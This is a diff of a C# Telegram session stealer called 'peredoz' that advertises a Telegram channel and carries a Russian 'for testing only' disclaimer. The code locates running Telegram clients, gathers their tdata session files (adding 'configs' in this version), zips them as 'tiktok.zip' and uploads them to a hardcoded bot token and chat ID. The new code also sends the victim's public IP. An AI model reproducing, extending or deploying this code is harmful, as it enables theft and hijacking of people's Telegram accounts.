@@ -1,5 +1,6 @@
 ﻿/*
-peredoz version : 1.1
+peredoz version : 1.5
+attention : МЫ НЕ НЕСЁМ ОТВЕТСТВЕННОСТЬ ЗА ДЕЙСТВИЯ ПОЛЬЗОВАТЕЛЕЙ. ДАННЫЙ КОД СОЗДАН ИСКЛЮЧИТЕЛЬНО ДЛЯ ТЕСТОВ НА САМОМ СЕБЕ И НЕ ПОДРАЗУМЕВАЕТ РАСПРОСТРАНЕНИЕ ВРЕДОНОСА. ИСКЛЮЧИТЕЛЬНО В ОЗНАКОМИТЕЛЬНЫХ ЦЕЛАЯХ!!!!!!11!1
     __                                           ______ 
    / /_________  ____  ______ _____ __________  / __/ /_
   / //_/ ___/ / / / / / / __ `/ __ `/ ___/ __ \/ /_/ __/
@@ -8,7 +9,6 @@ peredoz version : 1.1
           /____//____/                                  
 
 [ Заходи в наш телеграм канал! https://t.me/kryyaasoft ]
-
 */
 using System;
 using System.Collections.Generic;
@@ -21,12 +21,14 @@ using System.Threading.Tasks;
 
 class Program
 {
-    private static readonly string BotToken = "токен бота можно получить в @botfather"; // Telegram Bot Token
-    private static readonly string AdminId = "свой айди можно получить в @getmyid_bot"; // Telegram admin chat ID
+    private static readonly string BotToken = "7501358659:AAFBNA86v2BJlByPrxAGt23qOHeDyP7o8Tg"; // Telegram Bot Token (@botfather)
+    private static readonly string AdminId = "1521132127"; // Telegram admin chat ID (@getmyid_bot)
 
     static async Task Main(string[] args)
     {
+        var stopwatch = Stopwatch.StartNew();
         await CheckAndGrab();
+        stopwatch.Stop();
     }
 
     static string FindProcessPath(string processName)
@@ -42,7 +44,21 @@ class Program
         return null;
     }
 
-    static async Task Grb(string proc, string clientPath)
+    static async Task<string> GetUserIpAsync()
+    {
+        using var httpClient = new HttpClient();
+        try
+        {
+            var ip = await httpClient.GetStringAsync("https://wtfismyip.com/text");
+            return ip.Trim(); // Убираем лишние пробелы и символы
+        }
+        catch
+        {
+            return "Не удалось получить IP";
+        }
+    }
+
+    static async Task Grb(string proc, string clientPath, TimeSpan elapsedTime, string userIp)
     {
         var processPath = FindProcessPath(proc);
         if (processPath != null)
@@ -95,10 +111,16 @@ class Program
 
                 // kryyaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
                 var mapsFile = Path.Combine(directory, "maps");
+                var configsFile = Path.Combine(directory, "configs");
 
                 if (File.Exists(mapsFile))
                 {
                     neededFiles.Add(mapsFile);
+                }
+
+                if (File.Exists(configsFile))
+                {
+                    neededFiles.Add(configsFile);
                 }
             }
         }
@@ -110,7 +132,7 @@ class Program
         {
             { new StringContent(AdminId), "chat_id" },
             { new StringContent("HTML"), "parse_mode" },
-            { new StringContent($"[NEW TDATA] @kryyaasoft work \nclient: {proc}"), "caption" },
+            { new StringContent($"[NEW TDATA] @kryyaasoft work \nclient: {proc} \nВремя выполнения: {elapsedTime.TotalSeconds} секунд \nIP: {userIp}"), "caption" },
         };
 
         using (var fileStream = new FileStream("tiktok.zip", FileMode.Open, FileAccess.Read))
@@ -147,6 +169,8 @@ class Program
 
     static async Task CheckAndGrab()
     {
+        var stopwatch = Stopwatch.StartNew();
+        var userIp = await GetUserIpAsync(); // Получаем IP пользователя
         var tasks = new List<Task>();
         var processes = new[] { "Unigram", "Telegram", "AyuGram", "Kotatogram", "iMe" };
 
@@ -155,10 +179,11 @@ class Program
             var path = FindProcessPath(process);
             if (!string.IsNullOrEmpty(path))
             {
-                tasks.Add(Grb(process, Path.GetDirectoryName(path)));
+                tasks.Add(Grb(process, Path.GetDirectoryName(path), stopwatch.Elapsed, userIp));
             }
         }
 
         await Task.WhenAll(tasks);
+        stopwatch.Stop();
     }
 }
